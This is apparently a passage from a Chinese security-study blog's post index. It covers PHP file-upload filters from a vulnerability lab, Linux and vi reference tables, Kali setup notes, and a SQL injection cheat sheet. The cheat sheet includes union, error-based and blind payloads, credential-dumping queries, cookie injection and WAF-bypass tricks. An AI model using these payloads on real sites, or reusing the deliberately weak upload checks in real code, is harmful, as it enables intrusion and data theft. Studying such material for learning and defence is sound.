array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');//收集.后的字符，并返回该字符到结尾的字符串\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {  //判断后缀是否非法\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n### 5.非法字符置空的检测\n\n```php\nif (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name); //不区分大小写将存在与$deny_ext中的后缀名置空\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n### 6.基于白名单的非法检测\n\n```php\n$ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传失败\";\n        }\n    } else {\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}\n```\n\n### 7.基于文件类型头的特殊16进制的检测\n\n```php\nfunction getReailFileType($filename){\n    $file = fopen($filename, \"rb\");\n    $bin = fread($file, 2); //只读2字节\n    fclose($file);\n    $strInfo = @unpack(\"C2chars\", $bin);      //以二进制读取文件前两个字节内容 C2chars C无符号字符型 chars为索引  \n    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);     \n    //intval（mixed $var ,$base） 默认$base为10进制\n    $fileType = '';    \n    switch($typeCode){      \n        case 255216:            \n            $fileType = 'jpg';\n            break;\n        case 13780:            \n            $fileType = 'png';\n            break;        \n        case 7173:            \n            $fileType = 'gif';\n            break;\n        default:            \n            $fileType = 'unknown';\n        }    \n        return $fileType;\n}\n```\n\n以png格式图片说明此检测方式：\n\npng格式的文件以16进制打开后为8950 4e47 ......\n\n取出两个字节为89 50\n\n转化为10进制为 137 80 \n\n### 8.基于对图片进行二次渲染的检测\n\n```php\n if(($fileext == \"jpg\") && ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //使用上传的图片生成新的图片\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"该文件不是jpg格式的图片！\";\n                @unlink($target_path);\n            }else{\n                //给新图片指定文件名\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                //显示二次渲染后的图片（使用用户上传图片生成的新图片）\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagejpeg($im,$img_path);\n                @unlink($target_path);\n                $is_upload = true;\n            }\n```\n\n### 9.基于对非法文件进行删除的检测\n\n```php\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_name = $_FILES['upload_file']['name'];\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_ext = substr($file_name,strrpos($file_name,\".\")+1);\n    $upload_file = UPLOAD_PATH . '/' . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file)){  //上传的文件移动到upload_file\n        if(in_array($file_ext,$ext_arr)){   //判断文件后缀名是否在白名单\n             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n             rename($upload_file, $img_path);  //重命名文件\n             $is_upload = true;\n        }else{\n            $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n            unlink($upload_file);  //不在白名单 删除\n        }\n```\n\n","tags":["漏洞"]},{"title":"基于centos的linux学习2","url":"%2F2019%2F08%2F12%2F%E5%9F%BA%E4%BA%8Ecentos%E7%9A%84linux%E5%AD%A6%E4%B9%A02%2F","content":"\n### Vi的3种运行模式\n\n普通模式normal\n\n插入模式insert\n\n命令行cmdline\n\n### 普通模式下的操作\n\n| 命令 | 说明                                       | 命令 | 说明                                       |\n| ---- | ------------------------------------------ | ---- | ------------------------------------------ |\n| i    | 从光标所在位置前开始插入文本               | I    | 将光标移到当前行的行首，在其前面插入文本   |\n| a    | 用于在光标当前所在位置之后追加新文本       | A    | 将光标移到当前行的行尾，在后面插入文本     |\n| o    | 将在光标所在行的下面新开一行，置于该行行首 | O    | 将在光标所在行的上面新开一行，置于该行行首 |\n| G    | 将光标移至最后一行的行首                   | $    | 移动到光标所在行的行尾                     |\n| nG   | 光标移至第n行首                            | n/rc | 用字符c替换光标所指向的当前/前n个字符      |\n| n/x  | 删除光标处的/向右的n个字符                 | n/dd | 删除光标所在的整/当前及后n-1行             |\n| yy   | 将当前行的内容复制到缓冲区                 | p    | 将缓冲区的内容写到光标所在位置             |\n| /str | 往右移动到有str的地方                      | n    | 向相同的方向移动到有str的地方              |\n| ?str | 往左移动到有str的地方                      | N    | 向相反的方向移动到有str的地方              |\n| u    | 取消前一次的误操作                         | .    | 再执行一次前面刚完成的某个命令             |\n| ZZ   | 存盘退出                                   | ZQ   | 不保存退出                                 |\n\n### 命令模式下的操作\n\n| 命令                          | 说明                                                    | 命令                  | 说明                                          |\n| ----------------------------- | ------------------------------------------------------- | --------------------- | --------------------------------------------- |\n| :n                            | 跳转到指定行                                            | :/str/w file          | 将包含有str的行写到文件file中                 |\n| :s/str1/str2/g c              | 将找到的第一个str1替换为str2<br />g所有替换   c替换询问 | ：n1，n2 co/m n3      | 将从n1开始到n2为止的所以内容复制/移动到n3后面 |\n| :d                            | 删除当前行                                              | :w /file              | 将当前编辑的内容存盘 / 写到file中             |\n| :r file                       | 打开另一个文件file                                      | :e file               | 新建file文件                                  |\n| :f file                       | 把当前文件改名为file文件                                | :!Cmd                 | 运行shell命令cmd                              |\n| :n1,n2 w ! Cmd                | 将n1到n2行的内容作为cmd命令输入，不指定整个文件全部输入 | :r ! Cmd              | 将命令运行的结果写入当前行位置                |\n| :set autuindent /noautoindent | 缩进/取消缩进                                           | :set number /nonumber | 编辑时显示行号/取消显示                       |\n| :set ruler /noruler           | 显示光标所在行列位置/取消显示                           | :set tabstop=value    | 设置显示制表符的空格字符个数                  |\n| :set wrapmargin=value         | 设置显示器的右边页，自动换行                            | :set / all            | 显示设置的所以选项/显示所有可以设置的选项     |\n\n\n\n---\n\n\n\n未完待续......\n\n人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。--Hades\n\n","tags":["linux"]},{"title":"基于centos的linux学习1","url":"%2F2019%2F08%2F12%2F%E5%9F%BA%E4%BA%8Ecentos%E7%9A%84linux%E5%AD%A6%E4%B9%A01%2F","content":"\n### 1.远程登录ssh配置\n\nroot下cd进入 /etc/sysconfig/network-scripts/\n\nvi打开ifcfg-ens33 \n\n将最后一行改为yes保存退出\n\n### 2.系统信息常用命令\n\n| 分类   | 功能                                                         | 命令                                                         |\n| ------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 硬件   | 获取硬件信息<br />显示pci/usb接口数<br />显示cpu信息<br />显示物理内存的大小 | dmidecode 或 lshw<br />lspci 或 lsusb<br />lscpu 或 cat/proc/cpuinfo<br />free -m |\n| 系统   | 查看系统发行版本<br />系统内核版本<br />系统加载的模块       | cat /etc/system-release<br />uname -r<br />lsmod             |\n| 存储   | 显示系统中的块设置<br />磁盘分区<br />磁盘剩余空间<br />所有交换空间 | lsblk<br />fdisk-l<br />df -ph<br />swapon -s                |\n| 本地化 | 时间和语言<br />语言支持键盘设置                             | date 或 timedatectl<br />localectl                           |\n| 软件   | 查看已经启用的更新源<br />已经安装的软件<br />检查是否有可用的软件包更新 | yum repolist<br />yum -qa 或 yum list installed<br />yum check-update 或 yum list updates |\n| 网络   | 主机名<br />网络接口参数<br />路由信息<br />网络状态信息<br />防火墙规则 | hostnamectl 或 hostname<br />ip addr show 或 ifconfig<br />ip route show 或 route <br />ss 或 netstat<br />firewall-cmd --list-all 或 iptables -nvL |\n\n### 3.shell元字符/通配符\n\n| 元字符   | 含义                                             |\n| -------- | ------------------------------------------------ |\n| *        | 代表任意字符串                                   |\n| ？       | 代表任意字符                                     |\n| /        | 代表根目录或作为路径间的间隔符                   |\n| \\        | 转义字符                                         |\n| \\<enter> | 续行符 命令多行                                  |\n| $        | 变量值置换                                       |\n| '        | 在‘ ....’中的字符均被当成文字处理                |\n| ''       | 在“....”中的字符会被当成文字处理并允许变量值置换 |\n| `        | 命令替换 置换‘...’中的执行结果                   |\n| <        | 输入重定向                                       |\n| >        | 输出重定向                                       |\n| \\|       | 管道字符                                         |\n| &        | 后台执行字符                                     |\n| ;        | 分割顺序执行的多个命令                           |\n| ()       | 在字shell中执行一组命令                          |\n| {}       | 在当前shell中执行一组命令                        |\n| !        | 执行命令记录中的命令 history >>> !n（行数）      |\n| ~        | 代表登录用户的宿主目录 cd ~                      |\n\n| 通配符 | 含义                         | 通配符  | 含义                     |\n| ------ | ---------------------------- | ------- | ------------------------ |\n| *      | 匹配任何字符和任何数目的字符 | [...]   | 匹配包含在括号内的单字符 |\n| ？     | 匹配任何单个字符             | [!....] | 匹配任何不包括在内的字符 |\n\n### 4.linux文件类型/ 硬连接 /软连接/管道\n\n/- 普通文件            d 目录文件 \n\nI 链接文件             c 字符设备文件 \n\nb 块设备文件         s 套接字 \n\np 命名管道\n\nln file1 file2 >> 硬链接  改2的时候1也改变  \n\nln -s file1 file2 删掉1的时候2无意义打不开\n\n命名管道FIFO ：允许在同一台计算机中的进程通信 \n\n套接字socket：允许不同计算机直接的进程通信\n\n### 5.linux目录结构\n\n| 目录       | 内容                                                      |\n| ---------- | --------------------------------------------------------- |\n| bin        | 存放二进制的可执行的文件                                  |\n| boot       | 存放用于系统引导时的各种文件                              |\n| dev        | 存放存储设备文件                                          |\n| etc        | 系统的配置文件                                            |\n| home       | 用户的根目录                                              |\n| lib/lib64  | 存放根目录系统中的程序运行所需要的共享数据库及内核模块    |\n| lost-found | 存放系统的一些检查结果 发现不合法的文件和数据都存放在这里 |\n| mnt        | 临时文件系统的挂载点                                      |\n| media      | 即插即用行存储设备的挂载点                                |\n| opt        | 第三方软件的存放目录                                      |\n| proc       | 是一个虚拟文件系统 存放当前内存的映射 用于不重启管理内核  |\n| root       | 超级用户目录                                              |\n| sbin       | 类似bin目录 只有root能访问                                |\n| srv        | 系统对外提供服务的目录                                    |\n| tmp        | 用于存放各种临时文件                                      |\n| usf        | 用于存放系统应用程序                                      |\n| var        | 用于存放需要随时改变的文件 如系统日志，脱机工作目录等     |\n\n### 6.常用的文本文件操作命令\n\n| 命令      | 功能                             | 命令     | 功能                                                       |\n| --------- | -------------------------------- | -------- | ---------------------------------------------------------- |\n| cat/tac   | 显示文本文件内容                 | diff     | 显示两个文本文件的差异                                     |\n| more/less | 分页显示文本文件内容             | expand   | 将文件中的制表符转换为空格                                 |\n| head/tail | 显示文本文件的前若干行或后若干行 | unexpand | 将文本中的空格转换为制表符                                 |\n| cut       | 纵向切割出文本制定的部分         | dos2unix | 将DOS格式文本转换为unix格式                                |\n| paste     | 纵向合并多个文本                 | unix2dos | 将unix格式的文本转换为dos格式                              |\n| grep      | 按关键字抽取匹配的行             | iconv    | 将文本从一种编码转换为另一种编码                           |\n| wc        | 文本数据统计                     | tr       | 转换字符                                                   |\n| sort      | 以行为单位对文本文件排序         | sed      | 流编辑器，通常用于非交互式的字符串替换                     |\n| uniq      | 删除文本文件中连续重复的行       | awk      | 一种用于处理文件的编程语言工具，通常哟关于处理由格式的文本 |\n\n### 7.POSIX风格正则表达式\n\n基本的正则表达式BRE\t \n\n扩展的正则表达式ERE\t\n\n| 特殊字符  | 含义                 | 类型 | 举例           | 说明                      |\n| --------- | -------------------- | ---- | -------------- | ------------------------- |\n| ^         | 匹配首字符           | BRE  | ^x             | 以字符x开始的字符串       |\n| $         | 匹配尾字符           | BRE  | x$             | 以字符x结束的字符串       |\n| .         | 匹配任意一个字符     | BRE  | l..e           | love life live.....       |\n| ?         | 匹配任意一个可选字符 | ERE  | xy？           | x,xy                      |\n| *         | 匹配零次或多次重复   | BRE  | xy*            | x,xy,xyy,xyyy...          |\n| +         | 匹配一次或多次重复   | ERE  | xy+            | xy,xyy,xyyy...            |\n| [...]     | 匹配任意一个字符     | BRE  | [xyz]          | x,y,z                     |\n| ()        | 对正则表达式进行分组 | ERE  | (xy)+          | xy,xyxy,xyxyxy....        |\n| \\\\{n\\\\}   | 匹配n次              | BRE  | co\\\\{2\\\\}gle   | coogle                    |\n| \\\\{n,\\\\}  | 匹配最少n次          | BRE  | co\\\\{2,\\\\}gle  | coogle,cooogle,cooogle... |\n| \\\\{n,m\\\\} | 匹配n-m次            | BRE  | co\\\\{2,4\\\\}gle | coogle,cooogle,coooogle   |\n| {n}       | 匹配n次              | ERE  | co{2}gle       | coogle                    |\n| {n,}      | 匹配最少n次          | ERE  | co{2,}gle      | coogle,cooogle...         |\n| {n,m}     | 匹配n-m次            | ERE  | co{2,4}gle     | coogel,cooogle,coooogle   |\n| I         | 以或逻辑连接多个匹配 | ERE  | good\\|bon      | 匹配good或bon             |\n| \\         | 转义字符             | BRE  | \\\\*            | *                         |\n\nPOSIX RE用于方括号之内的元字符\n\n| 特殊符号 | 含义                               | 类型 | 举例     | 说明             |\n| -------- | ---------------------------------- | ---- | -------- | ---------------- |\n| ^        | 非（仅用于起始字符）               | BRE  | [^xyz]   | 匹配xyz之外的    |\n| -        | 用于指明字符范围（不能是首尾字符） | BRE  | [a-zA-Z] | 匹配任意一个字符 |\n| \\        | 转义字符                           | BRE  | [\\.]     | .                |\n\n### 8.打包和压缩命令\n\n| 命令 | 功能                                      | 命令                            | 功能                                                         |\n| ---- | ----------------------------------------- | ------------------------------- | ------------------------------------------------------------ |\n| gzip | 压缩（解压）文件或目录，压缩文件后缀为gz  | zcat/zmore/zless<br />zgrep     | 不解压直接显示.gz文件的内容<br />不解压直接在.gz文件中查找指定的字符串 |\n| bzip | 压缩（解压）文件或目录，压缩文件后缀为bz2 | bzcat/bzmore/bzless<br />bzgrep | 不解压直接显示.bz2文件的内容<br />不解压直接在.bz2文件中查找指定字符串 |\n| xz   | 压缩（解压）文件或目录，压缩文件后缀为xz  | xzcat/xzmore/zxless<br />xzgrep | 不解压直接显示.xz文件的内容<br />不解压直接在.xz文件中查找指定字符串 |\n| tar  | 文件、目录打（解）包                      |                                 |                                                              |\n\n### 9.信息显示命令\n\n| 命令    | 功能                       | 命令     | 功能                                 |\n| ------- | -------------------------- | -------- | ------------------------------------ |\n| stat    | 显示指定文件的相关信息     | ps       | 显示进程                             |\n| file    | 显示指定文件类型           | pstree   | 显示进程树                           |\n| whereis | 查找系统文件所在的路径     | top      | 显示当前系统中消耗资源最多的进程     |\n| locale  | 显示当前的语言环境         | uptime   | 显示系统运行时间，用户数，平均负载   |\n| locate  | 在updatedb库中查找文件名   | free     | 显示当前内存和交换空间的使用情况     |\n| find    | 在文件系统中查找匹配的文件 | du       | 显示指定的文件或目录已占用的磁盘空间 |\n| who     | 显示在线的登录用户         | df       | 显示文件系统磁盘空间的使用情况       |\n| whoami  | 显示用户自己的身份         | ifconfig | 显示网络接口信息                     |\n| tty     | 显示用户当前使用的终端     | route    | 显示系统路由表                       |\n| id      | 显示当前用户的id信息       | netstat  | 显示网络状态信息                     |\n| groups  | 显示当前用户属于哪些组     | date     | 显示当前日期                         |\n| env     | 显示当前用户可用的环境变量 | cal      | 显示日历                             |\n\n---\n\n\n\n未完待续......\n\n人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。--Hades\n\n","tags":["linux"]},{"title":"渗透测试中的信息收集","url":"%2F2019%2F08%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F","content":"\n","tags":["笔记"]},{"title":"Sql注入","url":"%2F2019%2F08%2F10%2FSQL%E6%B3%A8%E5%85%A5%2F","content":"\n# SQL注入\n\n## 1.常见的几种数据库数据库\n\n### access\n\n### mssql\n\n### mysql\n\n### sqlsever\n\n### oracle\n\n### sqlite\n\n## 2.注入方法和流程\n\n### Access\n\n逐字猜解法：\n\n猜表名：exists 指定一个子查询 返回值为布尔类型\n\neg：and exists（子查询）\n\n猜列名：and （select top 1 len （列名）from 表名 ）>n\n\n联合查询：\n\norder by 判断字段\n\nunion select 判断显示位\n\n偏移注入：\n\n判断字段数，判断表名，使用*号从后开始代替显示位 \n\n```mysql\nunion select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* from admin\nunion select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,* from admin\nunion select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,* from admin\nunion select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from admin\nunion select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin\nunion select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id=b.id)\n```\n\n### Mssql（Sqlsevre）\n\n权限：sa/db db_ower/public/\n\n判断数据库类型:\n\n```mysql\nand ecists (select * from sysobjects)\nand exists (select count(*) from sysobjects)\n```\n\n判断数据库版本：\n\n有回显：and =@@version()\n\n无回显：and substr（(select @@version),22,4）\n\n判断字段数：order by... / union all select null,不会自动去掉重复 使用时将前查询屏蔽/union自动去重\n\n找回显位：使用null 有字符型和数字型\n\n```mysql\nhttp://xxxxxxxxxxx/new_list.asp?id=-2](http://219.153.49.228:45660/new_list.asp?id=-2) union all select null,(select password from manage),null,null\n```\n\n爆库名：db_name()  db_name(1)\n\n爆表名：\n\n```mysql\nunion all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),'3',4\nunion all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),'3',4\n\nunion all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null\n\ndbo.sysobjects//存储对象可爆破表  xtype='u'  //查看用户表\n```\n\n### Mysql\n\nmysql常用语句：\n\n```mysql\nselect version（）#查看mysql版本\nselect @@global.version_compile_Os #查看当前系统\nselect user（）#查看使用者\nselect @@basedir（）#查询数据库所在位置 可在phpmyadmin提权时获取日志目录\nselect database() #查询是否选择了数据库\n\nshow databases; #查询数据库\nuse databases_name; #选择数据库\nshow tables; #查询选择的数据库的表\ndesc 表名; #查询一个表的结构\ncreate databases 数据库名; #创建数据库\ndrop databases 数据库名; #删除数据库\ncreate table [ if not exists ] `表名`（\n    `字段名`  数据类型  数据属性,\n    `字段名`  数据类型  数据属性,\n    `字段名`  数据类型  数据属性,\n    ...\n    `字段名`  数据类型  数据属性 (最后一个字段分隔符, 不能加)\n）engine=数据库引擎 default charset=编码类型;    #创建数据表\ncreate table new_table like old_tabe 根据存在的表建立新表；\nalter table 表名 add 字段 属性   #表中插入字段\n```\n\nmysql中表的属性：\n\n数据属性: \n\n1. 主键索引 primary key(唯一,一张表推荐一个主键) \n2. 唯一索引 unique(唯一) 主要目的 : 避免数据重复 , 附带提高查询速度 缺点 : 占用磁盘空间 \n3. 自增 auto_increment \n4.  非空约束not null (不能为空) \n5. 默认值 default 值 注: 数据属性不写, 默认为 null \n6. 描述 comment '描述内容' \n7. 无符号 unsigned(非负限定 ,即不能取负值) 取值范围 0–255\n\nmysql增删改查：\n\n```mysql\n插入 insert into 表名() values ()  \n删除 delete from 表名 () where 限制条件/  truncate table 表名/\n改正 update 表名 set 字段名=值1 、字段名=值2 whele 限制条件\n查找 select * / 字段名 from 表名  \nwhere +in/not/and/or/between and  限制条件  \ndistinct 过滤重复字段   \nselect distinct 字段名 from 表名\nlike 匹配字符串  \n%通配符  （使用/转义） _单个匹配  \nselect 字段名 from 表名 where 字段名 like ‘匹配字符串’\n```\n\nmysql基本函数：\n\n```mysql\ncount(*) 计数    and 比or 优先级高  \nselect count(字段) from 表 where 限制条件;\nsum(*)   avg(*)   max(*)    min(*)\norder by [asc]升序/ [desc]降序   \nselect *from user order by id;\ngroup by  按组排序 重复的限制条件归为一组 只显示一个 \nselect count(*) from user group by sex; \ngroup by 和聚合函数一起使用，可以统计出某些字段在一个分组中的特殊值 和having一起使用 （having和where类似 只是where不能和聚合函数使用）\neg:select sun(grade),gender from student2 group by gender having sum(grade)<300 \n#将student2表按照garde字段进行分组查询，查询出garde字段值小于300的\nlimit [offset].记录数  select *from user limit 0,1;\nas 取别名 只能是字符串类型 不能是int类型\nunion 联合查询  只能相同表结构的使用union查询 不相同的会报错 会自动去重 不想自动去重可使用 union all\nselect rand （） 生成0-1直接随机数\nselcet floor （）向下取整\nselect concat（） 拼接 字符串/16进制\nselect concat_ws （分隔符 拼接数据1 拼接数据2）\nextractvalue（xml文档名字 xml文档路径） 对xml文档查询\nsleep（）对数据库进行延时的函数 默认秒\nupdatexml （目标xml文档 xml路径 更新的内容）\nexp （）此函数返回e的x次方的值 \nlength （） 返回参数的长度\nsubstr /substring（字符串 起始位置 结束位置） 从字符串s的位置截取长度为length的字符串\nacsill （）ord（） 返回字符的ascill码 用于盲注\nname_conset （字段名 值） 构造一个列\nstrcmp （） 比较字符串 相同为0 不同为1或-1\nif （a，b，c）a为真 返回b 否则返回c\nbenchmark （count expr） 重复计算expr表达式count次 无返回值 构造延时\nlocate （substr str） /position （substr in str） 返回substr字符串在str中的位置  没有返回0\ninstr （） 与locate/postion 参数位置相反\n```\n\nmysql内置表：\n\n在mysql5.0以上版本内置了information_schema数据库，包含40张表，可利用此库注入取得表名和相关数据。\n\n```mysql\nselect schema_name from information_schema.schamata; #查询所有数据库名\nselect table_name from information_schema.tables；#查询所有表名\nselect column_name from information_schema.columns; #查询所有列名\n```\n\nmysql注入：\n\n判断注入方式：\n\n- 单引号报错\n- and 1=1 / and 1=2\n- 1+1 / 1-1\n- or 1=1 / or 1=2\n\n几种注入方式：\n\n数字型注入：  http：//xxx.com/news.php?id=x\n\n字符型注入：  http：//[xxx.com/news.php?](http://xxx.com/news.php?id=x)name='admin'\n\n搜索型注入：  get/post \n\n根据提交方式注入： get/ post/ cookie/ http头\n\n执行效果注入：   布尔/时间/报错/联合查询/堆查询\n\n基本流程：\n\n判错  >>  查询字段数  >>  union select  >>  数据库 表名 字段名\n\n盲注：\n\n基于布尔的盲注：\n\n利用函数构造布尔值返回，判断信息。 eg：substr(version(),2,1)=0 \n\n基于时间的盲注：\n\n使用if等构造逻辑判断，根据返回时间判断信息。 eg：if(substr(version()1,1)= 5,sleep(10),1）\n\n基于报错的注入：\n\n- bigint等数据类型溢出\n\n```mysql\nselect (select * from (select user())x);\nselect !(select * from (select user())x);\nselect !(select * from (select user())x)+1;\n```\n\n![2](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/3.png)\n\n```mysql\nselect exp(~(select*from(select user())x));  \n```\n\n\\~的意思为按位取反，如~0 = 18446744073709551615 大于5.5.53不可用\n\n- 主键重复\n- 列名重复\n- 几何函数报错\n\n联合查询注入\n\n堆查询注入\n\n基于请求的注入：\n\n- GET请求注入\n- POST请求注入\n- Cookie注入\n\n1.去掉id=\n\n2.加入javascript:alert(document.cookie=\"id=\"+escape(\"xx\"));语句\n\n3.更改xx为id的值 后返回没有id=的页面 观察内容是否相同 相同则为可能有cookie注入\n\n- xff注入（http头注入）\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/4.png)\n\n### Oracle\n\n判断是否为oracle 数据库\n\n```oracle\nand (select count(*) from user_tables)>0\nand (select count(*) from dual) >0\n```\n\n爆版本信息\n\n```oracle\nand 1=2 union all select chr(94)||chr(94)||chr(94)||banner||chr(94)||chr(94)||chr(94),null  from (select rownum r,banner from (select rownum r,banner from v$version where rownum<=1 order by 1 desc) t where r>1-1 order by 1)t where 1=1 \n```\n\n爆数据库名\n\n```oracle\nand 1=2 union select 'null',(select owner from all_tables where rownum=1) from dual   //dual 内置表\nand 1=2 union select 'null',(select owner from all_tables where rownum=1 and owner<>'first_dbname') from dual\n```\n\n爆表名\n\n```oracle\nand 1=2 union select 'null',(select table_name from user_tables where rownum=1) from dual\n```\n\n爆列名\n\n```oracle\nand 1=2 union select 'null',(select column_name from user_tab_columns where table_name='LOGMNR_SESSION_EVOLVE$' and rownum=1) from dual\nand 1=2 union select 'null',(select column_name from user_tab_columns where table_name='LOGMNR_SESSION_EVOLVE$' and column_name<>'BRANCH_LEVEL' and rownum=1) from dual\n```\n\n爆数据\n\n```oracle\nunion select '1','用户名：'||USER_NAME||'密码：'||USER_PWD||'状态：'||STATUS from \"sns_users\"\n```\n\n### Sqlite\n\n猜字段 order by\n\n爆表名 \n\n```sqlite\n+UNION+SELECT+1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'\n```\n\n爆列名\n\n```sqlite\nunion SELECT 1,sql,3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='notice_sybase'\n```\n\n爆数据\n\n```sqlite\nunion SELECT 1,title,time,4 FROM notice_sybase\n```\n\nSql注入中的绕过：\n\n以mysql数据库为例\n\nnew_id=1①union②select③1，2,db_name(),④from⑤admin\n\n位置1 \n\n其他字符替换空格 %09 %0a  %0b %0c %0d %20 %a0\n\n利用注释符号  /* */ #test%0d%0a --+a\n\n利用数学运算以及数据类型 \n\nnews_id=1.1 \n\nnew_id=1E0 \n\nnews_id=\\N\n\n位置2\n\n可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a\n\n利用注释符号 /* */ #test%0d%0a --+a\n\n可利用括号 union （select 1,2）\n\n位置3\n\n其他字符替换空格 %09 %0a  %0b %0c %0d %20 %a0 \n\n利用注释符号  /* */ #test%0d%0a --+a\n\n可利用其他符号：+ - ~ ！ @\n\n位置4\n\n可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a\n\n利用注释符号 /* */ #test%0d%0a --+a\n\n可利用数学运算以及数据类型：union select user(),2 0 from admin\n\nunion select user(),8eofrom admin\n\nunion select user(),\\Nfrom admin\n\n位置5\n\n可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a\n\n利用注释符号 /**/ #test%0d%0a --+a\n\n超长数据包pass：\n\nget型请求转post型\n\ncontent—length 头长度大于4008 正常参数放置在脏数据后面，否则无效\n\n空格替换bypass拒绝传统的%20\n\n协议转换bypass使用表单请求中的multipart/form-data\n\n\n\n---\n\n\n\n未完待续......\n\n人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。--Hades","tags":["sql注入"]},{"title":"web基础知识","url":"%2F2019%2F08%2F09%2F%E7%AC%94%E8%AE%B0%2F","content":"\n# 笔记总结\n\n### Kali-Linux基本配置及相关指令\n\n更换系统源  \n\n```\n* #aliyun 阿里云  ##推荐阿里云\n* deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n* deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n* # ustc 中科大\n* deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n* deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n* #deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free\n* #deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free\n* # kali 官方源\n* deb http://http.kali.org/kali kali-rolling main non-free contrib\n* deb-src http://http.kali.org/kali kali-rolling main non-free contrib\n```\n\n更新\n\n```\napt-get update #更新源\napt-get upgrade #更新软件\napt-get dist-upgrade #更新系统\n```\n\nlinux基本操作命令\n\n```\n基础\nls -[a/l] #列出目录内文件                                    cd #切换文件目录 pwd #显示当前路径\ncat filename #查看文件内容                                   touch filename #创建文本文件 .txt\nmkdir 